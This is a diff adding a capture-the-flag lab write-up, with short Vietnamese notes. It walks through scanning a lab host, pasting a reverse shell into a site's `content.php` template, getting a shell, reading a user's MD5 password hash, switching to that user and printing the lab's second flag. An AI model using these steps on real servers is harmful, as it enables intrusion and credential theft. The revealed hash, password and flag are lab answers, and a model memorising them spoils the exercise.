@@ -1,0 +1,94 @@
+```
+┌──(kali㉿kali)-[~]
+└─$ nmap -sV -sC 10.113.147.189  
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-28 22:56 EDT
+Nmap scan report for 10.113.147.189
+Host is up (0.26s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b8:7d:7c:d9:de:20:aa:c5:e9:18:a6:6f:ce:42:85:e9 (RSA)
+|   256 1d:62:78:33:93:93:32:a9:90:76:07:25:fb:24:dd:f6 (ECDSA)
+|_  256 75:5b:1a:ea:9b:db:c1:2e:24:12:83:f5:da:82:34:a2 (ED25519)
+80/tcp  open  http     Apache httpd
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache
+443/tcp open  ssl/http Apache httpd
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+|_http-server-header: Apache
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 47.76 seconds
+```
+
+```
+
+```
+
+<img width="513" height="137" alt="image" src="https://github.com/user-attachments/assets/23d252c4-6f9f-41f5-91d3-6f7a5bee641f" />
+
+<img width="555" height="121" alt="image" src="https://github.com/user-attachments/assets/fafc0e84-350e-4114-8ffb-55b6590a291b" />
+
+<img width="675" height="352" alt="image" src="https://github.com/user-attachments/assets/5f456e66-8d06-4e4c-bf8d-0857835b9b94" />
+
+<img width="555" height="218" alt="image" src="https://github.com/user-attachments/assets/9b128d18-4a56-4732-ae88-406dee562977" />
+
+<img width="548" height="597" alt="image" src="https://github.com/user-attachments/assets/07678c6f-96d3-480c-9484-118a5faaa468" />
+
+<img width="967" height="801" alt="Screenshot_2026-07-28_23_09_50" src="https://github.com/user-attachments/assets/cde52273-268a-4beb-876d-27a9f554f536" />
+
+Chon `content.php` de tai reverse shell
+
+<img width="958" height="799" alt="Screenshot_2026-07-28_23_16_51" src="https://github.com/user-attachments/assets/65f1d6fb-b4da-4ecd-8a20-29f3c75e29f4" />
+
+<img width="697" height="728" alt="image" src="https://github.com/user-attachments/assets/e73394fd-2765-4aee-8a73-e8ff5e1b85aa" />
+
+Copy va Paste phan reverse shell vao trong `content.php`
+
+<img width="961" height="799" alt="Screenshot_2026-07-28_23_19_20" src="https://github.com/user-attachments/assets/ea49a7e3-7aa0-4805-b391-af2b44415ec8" />
+
+Upload noi dung vua paste
+
+<img width="533" height="120" alt="image" src="https://github.com/user-attachments/assets/718e2384-388c-4445-971e-1d2f27bf3ad0" />
+
+<img width="548" height="87" alt="image" src="https://github.com/user-attachments/assets/eaa4869a-0a3b-4bd6-9c62-05e1a9d5d7e5" />
+
+<img width="942" height="212" alt="image" src="https://github.com/user-attachments/assets/592e5d63-4318-49a6-97c5-eef8e955be3c" />
+
+```
+$ whoami
+daemon
+```
+
+```
+$ cd /home
+$ ls
+robot
+ubuntu
+$ cd robot
+$ ls
+key-2-of-3.txt
+password.raw-md5
+$ cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+<img width="838" height="417" alt="image" src="https://github.com/user-attachments/assets/5c8a1d20-b6e9-4670-a620-6f65195088bf" />
+
+```
+$ su robot
+Password: abcdefghijklmnopqrstuvwxyz
+whoami
+robot
+ls
+key-2-of-3.txt
+password.raw-md5
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+
+
